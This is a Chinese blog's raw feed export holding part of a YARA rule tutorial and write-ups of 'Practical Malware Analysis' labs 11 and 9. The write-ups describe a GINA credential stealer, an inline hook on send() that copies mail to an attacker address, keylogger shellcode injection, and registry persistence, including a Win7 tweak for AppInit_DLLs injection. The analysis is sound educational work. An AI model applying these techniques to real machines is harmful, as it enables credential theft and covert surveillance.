src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/13.png"></p><p>也可以在正则表达式中使用文本修饰符，<code>nocase</code>、<code>ascii</code>、<code>wide</code>和<code>fullword</code>。</p><p>正则表达式还可以识别以下元字符</p><table><thead><tr><th>\</th><th>引用下一个元字符</th></tr></thead><tbody><tr><td>^</td><td>匹配文件的开头</td></tr><tr><td>$</td><td>匹配文件的结尾</td></tr><tr><td>|</td><td>交替</td></tr><tr><td>()</td><td>分组</td></tr><tr><td>[]</td><td>带括号的字符类</td></tr></tbody></table><p>也可以使用以下量词</p><table><thead><tr><th>*</th><th>匹配0次或多次</th></tr></thead><tbody><tr><td>+</td><td>匹配1次或多次</td></tr><tr><td>?</td><td>匹配0或1次</td></tr><tr><td>{n}</td><td>完全匹配n次</td></tr><tr><td>{n,}</td><td>至少匹配n次</td></tr><tr><td>{,m}</td><td>最多匹配n次</td></tr><tr><td>{n,m}</td><td>匹配n到m次</td></tr></tbody></table><p>这些量词还有一个非贪婪的变体，后面跟一个问号（？）</p><table><thead><tr><th>*?</th><th>匹配0次或多次，非贪婪</th></tr></thead><tbody><tr><td>+?</td><td>匹配1次或多次，非贪婪</td></tr><tr><td>??</td><td>匹配0或1次，非贪婪</td></tr><tr><td>{n}?</td><td>完全匹配n次，非贪婪</td></tr><tr><td>{n,}?</td><td>至少匹配n次，非贪婪</td></tr><tr><td>{,m}?</td><td>最多匹配n次，非贪婪</td></tr><tr><td>{n,m}?</td><td>匹配n到m次，非贪婪</td></tr></tbody></table><p>字符序列</p><table><thead><tr><th>\w</th><th>匹配一个单词字符（字母数字加_）</th></tr></thead><tbody><tr><td>\W</td><td>匹配一个非单词字符</td></tr><tr><td>\s</td><td>匹配一个空白字符</td></tr><tr><td>\S</td><td>匹配一个非空白字符</td></tr><tr><td>\d</td><td>匹配一个十进制数字字符</td></tr><tr><td>\D</td><td>匹配一个非数字字符</td></tr></tbody></table><h4 id="私有字符串"><a href="#私有字符串" class="headerlink" title="私有字符串"></a>私有字符串</h4><p>yara中的所有字符串都可以标记为<code>private</code>，这意味着它们将永远不会出现在yara的输出之中，当使用<code>-s</code>参数时也无法看到回显。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;asd&quot;</span> private<br>condition:<br><span class="hljs-variable">$a</span> <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/14.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p><a href="https://www.yuque.com/p1ut0/qtmgyx/eubd9v#4CpNb">https://www.yuque.com/p1ut0/qtmgyx/eubd9v#4CpNb</a></p><p><a href="https://bbs.pediy.com/thread-226011.htm#msg_header_h3_15">https://bbs.pediy.com/thread-226011.htm#msg_header_h3_15</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;yara是一种皆在帮助恶意软件研究人员识别和分类恶意软件样本的工具。每一个描述，也就是规则，由一组字符串和一个确定其逻辑布尔表达式组成。&lt;/</summary>
      
    
    
    
    <category term="YARA" scheme="https://b1ackie.cn/categories/YARA/"/>
    
    
    <category term="YARA" scheme="https://b1ackie.cn/tags/YARA/"/>
    
    <category term="恶意代码检测" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验11</title>
    <link href="https://b1ackie.cn/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/"/>
    <id>https://b1ackie.cn/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/</id>
    <published>2021-09-07T07:59:01.000Z</published>
    <updated>2021-09-08T09:08:42.886Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-11-1"><a href="#Lab-11-1" class="headerlink" title="Lab 11-1"></a>Lab 11-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑监控行为，可以看到其向当前的目录下释放了一个Dll文件。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-1.png"></p><p>IDA查看，可以看到很明显的从资源节中释放文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-2.png"></p><p>之后会进行注册表的相关操作。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-3.png"></p><p>可以看到在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon下创建了一个键值GinaDLL，值是释放的DLL的路径。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-4.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-5.png"></p><p>打开DLL文件，查看其导出表，可以看到大量的Wlx开头的函数，由此可以判断出这是一个GINA拦截，窃取用户登录凭证。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-6.png"></p><p>通过查看字符串可以看到一个msutil32.sys，仔细查看发现，是创建此文件，然后向其中写一些数据，写入的数据是什么需要继续往外分析，查看传入的参数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-7.png"></p><p>可以看到写入的数据，是一个结构体的相关信息。而这就是登录账户的信息。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">typedef struct _WLX_MPR_NOTIFY_INFO &#123;<br>  PWSTR pszUserName;<span class="hljs-regexp">//</span>登录账户名称<br>  PWSTR pszDomain;<span class="hljs-regexp">//</span>登录域名称<br>  PWSTR pszPassword;<span class="hljs-regexp">//</span>密码<br>  PWSTR pszOldPassword;<span class="hljs-regexp">//</span>旧密码<br>&#125; WLX_MPR_NOTIFY_INFO, *PWLX_MPR_NOTIFY_INFO;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/1-8.png"></p><h3 id="1-这个恶意代码向磁盘释放了什么？"><a href="#1-这个恶意代码向磁盘释放了什么？" class="headerlink" title="1.这个恶意代码向磁盘释放了什么？"></a>1.这个恶意代码向磁盘释放了什么？</h3><p>释放了一个msgina32.dll文件。</p><h3 id="2-这个恶意代码如何进行驻留？"><a href="#2-这个恶意代码如何进行驻留？" class="headerlink" title="2.这个恶意代码如何进行驻留？"></a>2.这个恶意代码如何进行驻留？</h3><p>设置注册表，成为winlogon的一员。</p><h3 id="3-这个恶意代码如何窃取用户登录凭证？"><a href="#3-这个恶意代码如何窃取用户登录凭证？" class="headerlink" title="3.这个恶意代码如何窃取用户登录凭证？"></a>3.这个恶意代码如何窃取用户登录凭证？</h3><p>GINA拦截用户登录信息</p><h3 id="4-这个恶意代码对窃取的证书做了什么处理？"><a href="#4-这个恶意代码对窃取的证书做了什么处理？" class="headerlink" title="4.这个恶意代码对窃取的证书做了什么处理？"></a>4.这个恶意代码对窃取的证书做了什么处理？</h3><p>将其保存到msutil32.sys文件中。</p><h3 id="5-如何在你的测试环境下让这个恶意代码获得用户凭证？"><a href="#5-如何在你的测试环境下让这个恶意代码获得用户凭证？" class="headerlink" title="5.如何在你的测试环境下让这个恶意代码获得用户凭证？"></a>5.如何在你的测试环境下让这个恶意代码获得用户凭证？</h3><p>需要先重启，启动拦截，然后注销系统，再次登录时，信息就会被记录。</p><h2 id="Lab-11-2"><a href="#Lab-11-2" class="headerlink" title="Lab 11-2"></a>Lab 11-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开DLL，看到DLL main函数。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-1.png"></p><p>首先会尝试打开C:\Windows\system32\Lab11-02.ini这个文件，可以看到模式是打开存在的文件</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-2.png"></p><p>然后会读取文件中的数据，这是读取到的数据。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-3.png"></p><p>解密算法，解密出数据<a href="mailto:&#x62;&#x69;&#108;&#108;&#121;&#x40;&#x6d;&#97;&#x6c;&#x77;&#x61;&#x72;&#x65;&#97;&#110;&#97;&#108;&#121;&#x73;&#105;&#x73;&#98;&#x6f;&#x6f;&#107;&#x2e;&#x63;&#x6f;&#x6d;">&#x62;&#x69;&#108;&#108;&#121;&#x40;&#x6d;&#97;&#x6c;&#x77;&#x61;&#x72;&#x65;&#97;&#110;&#97;&#108;&#121;&#x73;&#105;&#x73;&#98;&#x6f;&#x6f;&#107;&#x2e;&#x63;&#x6f;&#x6d;</a>，是一个邮箱地址。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-4.png"></p><p>然后会进行比较当前运行的是否是THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE这三个程序，如果是的话会执行下面的三个函数</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-5.png"></p><p>之后会获取send函数的地址，来进行inline hook</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-6.png"></p><p>HOOK函数，关于inline hook的相关知识可以查看这里，<a href="https://b1ackie.cn/2021/07/28/HOOK-Inline%20Hook/">inline hook</a></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-7.png"></p><p>inline hook前</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-8.png"></p><p>inline hook后</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-9.png"></p><p>查看HOOK后的jmp地址，这个函数检测send中发送的数据如果含有RCPT TO:，会加入一个新的RCPT TO: <a href="mailto:&#98;&#x69;&#x6c;&#x6c;&#x79;&#x40;&#x6d;&#x61;&#108;&#119;&#x61;&#x72;&#101;&#x61;&#110;&#x61;&#108;&#x79;&#115;&#x69;&#x73;&#98;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#109;">&#98;&#x69;&#x6c;&#x6c;&#x79;&#x40;&#x6d;&#x61;&#108;&#119;&#x61;&#x72;&#101;&#x61;&#110;&#x61;&#108;&#x79;&#115;&#x69;&#x73;&#98;&#x6f;&#x6f;&#x6b;&#46;&#x63;&#x6f;&#109;</a>，RCPT TO是收件人的意思，也就是发送的所有邮件都会被发送到恶意的邮箱去。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-11.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-12.png"></p><p>DLL还有一个导出函数install，可以看到是设置了一个键值。分析是在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs中设置了spoolvxx32.dll，这个键值的作用是当前所有加载user32.dll的程序都会再次加载此键值中的dll。之后会将自身复制到system32目录下。</p><p>但是实际测试中发现并没有实现，原因是在XP中这样可以实现，而在win7中不行。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-13.png"></p><p>win7需要按照如图中设置，即可实现DLL的注入。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-14.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/2-15.png"></p><h3 id="1-这个恶意DLL导出了什么？"><a href="#1-这个恶意DLL导出了什么？" class="headerlink" title="1.这个恶意DLL导出了什么？"></a>1.这个恶意DLL导出了什么？</h3><p>导出了一个install函数</p><h3 id="2-使用rundll32-exe安装这个恶意代码后，发生了什么？"><a href="#2-使用rundll32-exe安装这个恶意代码后，发生了什么？" class="headerlink" title="2.使用rundll32.exe安装这个恶意代码后，发生了什么？"></a>2.使用rundll32.exe安装这个恶意代码后，发生了什么？</h3><p>会将自身复制到system32目录下，还会设置HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs，这会实现DLL的注入。</p><h3 id="3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？"><a href="#3-为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？" class="headerlink" title="3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？"></a>3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</h3><p>根据上面分析可知必须放在system32目录下。</p><h3 id="4-这个安装的恶意代码如何驻留？"><a href="#4-这个安装的恶意代码如何驻留？" class="headerlink" title="4.这个安装的恶意代码如何驻留？"></a>4.这个安装的恶意代码如何驻留？</h3><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows下的AppInit_DLLs在这个键值中写入DLL的路径，可以实现持久化驻留。</p><h3 id="5-这个恶意代码采用的用户态Rootkit技术是什么？"><a href="#5-这个恶意代码采用的用户态Rootkit技术是什么？" class="headerlink" title="5.这个恶意代码采用的用户态Rootkit技术是什么？"></a>5.这个恶意代码采用的用户态Rootkit技术是什么？</h3><p>inline hook</p><h3 id="6-挂钩代码做了什么？"><a href="#6-挂钩代码做了什么？" class="headerlink" title="6.挂钩代码做了什么？"></a>6.挂钩代码做了什么？</h3><p>修改了send函数，所有向外发送包含RCPT TO：几个字符的邮件会被额外添加一行，发送给恶意账户。</p><h3 id="7-哪个或者哪些进程执行了这个恶意攻击，为什么？"><a href="#7-哪个或者哪些进程执行了这个恶意攻击，为什么？" class="headerlink" title="7.哪个或者哪些进程执行了这个恶意攻击，为什么？"></a>7.哪个或者哪些进程执行了这个恶意攻击，为什么？</h3><p>THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE，查询发现，它们都是邮件进程</p><h3 id="8-ini文件的意义是什么？"><a href="#8-ini文件的意义是什么？" class="headerlink" title="8..ini文件的意义是什么？"></a>8..ini文件的意义是什么？</h3><p>存储机密过后的恶意电子邮件地址，用来读取解密。</p><h3 id="9-你怎样用wireshark动态抓取这个恶意代码的行为？"><a href="#9-你怎样用wireshark动态抓取这个恶意代码的行为？" class="headerlink" title="9.你怎样用wireshark动态抓取这个恶意代码的行为？"></a>9.你怎样用wireshark动态抓取这个恶意代码的行为？</h3><p>可以查看与邮件相关的数据包来进行分析。</p><h2 id="Lab-11-3"><a href="#Lab-11-3" class="headerlink" title="Lab 11-3"></a>Lab 11-3</h2><p>此实验最好在XP中进行，win7运行没有cisvc.exe。</p><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>分析程序，可以看到首先复制了文件，之后调用了sub401070</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-1.png"></p><p>然后经过分析是将一段shellcode注入到cisvc.exe中。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-2.png"></p><p>之后就是执行了CMD命令，net start cisvc</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-9.png"></p><p>可以通过工具看到注入前后的入口点明显发生了变化</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-3.png"></p><p>分析shellcode发现主要是调用了恶意DLL中的函数zzz69806582</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-4.png"></p><p>分析DLL，查看这个导出函数看到它创建了一个新的线程。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-5.png"></p><p>继续分析新线程，打开发现其创建了一个互斥量防止重复运行，然后创建一个C:\WINDOWS\System32\kernel64x.dll文件，然后是键盘记录功能。记录在创建的文件之中。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-6.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-7.png"></p><p>记录的一些信息</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-8.png"></p><h3 id="1-使用基础的静态分析过程，你可以发现什么有趣的线索？"><a href="#1-使用基础的静态分析过程，你可以发现什么有趣的线索？" class="headerlink" title="1.使用基础的静态分析过程，你可以发现什么有趣的线索？"></a>1.使用基础的静态分析过程，你可以发现什么有趣的线索？</h3><p>可以看到其中的字符串和一些API，字符串有cmd.exe猜测其启用了cmd，DLL中的导入表有GetAsyncKeyState，猜测可能有键盘记录。</p><h3 id="2-当运行这个恶意代码时，发生了什么？"><a href="#2-当运行这个恶意代码时，发生了什么？" class="headerlink" title="2.当运行这个恶意代码时，发生了什么？"></a>2.当运行这个恶意代码时，发生了什么？</h3><p>会进行键盘的记录</p><h3 id="3-Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？"><a href="#3-Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？" class="headerlink" title="3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？"></a>3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</h3><p>将其复制在了system32目录下，然后还向cisvc.exe注入了shellcode，使其加载恶意DLL的导出函数实现键盘记录。</p><h3 id="4-这个恶意代码感染windows系统的哪个文件？"><a href="#4-这个恶意代码感染windows系统的哪个文件？" class="headerlink" title="4.这个恶意代码感染windows系统的哪个文件？"></a>4.这个恶意代码感染windows系统的哪个文件？</h3><p>cisvc.exe</p><h3 id="5-Lab11-03-dll做了什么？"><a href="#5-Lab11-03-dll做了什么？" class="headerlink" title="5.Lab11-03.dll做了什么？"></a>5.Lab11-03.dll做了什么？</h3><p>创建了dll文件，在其中进行键盘记录</p><h3 id="6-这个恶意代码将收集的数据存放在何处？"><a href="#6-这个恶意代码将收集的数据存放在何处？" class="headerlink" title="6.这个恶意代码将收集的数据存放在何处？"></a>6.这个恶意代码将收集的数据存放在何处？</h3><p>C:\WINDOWS\System32\kernel64x.dll之中</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-11-1&quot;&gt;&lt;a href=&quot;#Lab-11-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 11-1&quot;&gt;&lt;/a&gt;Lab 11-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验9</title>
    <link href="https://b1ackie.cn/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/"/>
    <id>https://b1ackie.cn/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/</id>
    <published>2021-09-01T08:22:24.000Z</published>
    <updated>2021-09-07T03:31:58.052Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-9-1"><a href="#Lab-9-1" class="headerlink" title="Lab 9-1"></a>Lab 9-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序，首先看到判断当前程序是否带了参数，如果带了参数，就进行后面的操作，如果没有带参数，会尝试打开一个键值，如果不存在此键值，则程序自删除，如果存在就会开始和服务器端通信，这些后面再说。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.1.png"></p><p>之后会进行判断，首先判断当前输入的最后一个参数是否等于abcd。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.2.png"></p><p>然后就是判断输入的第一个参数是什么，-in,-re,-c,-cc。</p><h4 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h4><p>-in参数，首先创建了一个系统服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.3.png"></p><p>然后将自身复制到system32下</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.4.png"></p><p>然后创建注册表表项，并且设置键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.5.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.6.png"></p><p>恶意代码安装的服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.7.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.8.png"></p><p>设置的键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.12.png"></p><h4 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h4><p>-re参数是删除配置信息，将服务删除，复制的文件删除，注册表信息也清空。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.9.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.10.png"></p><p>刚才创建的键值已经被删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.11.png"></p><h4 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h4><p>-c参数是设置自己的配置信息，根据-c后面的四个参数进行设置</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.13.png"></p><p>输入1 2 3 4</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.14.png"></p><h4 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h4><p>-cc 是打印当前的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.15.png"></p><p>打印出来的信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.16.png"></p><p>如果参数不符合要求都会进行自删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.17.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.18.png"></p><h4 id="后门"><a href="#后门" class="headerlink" 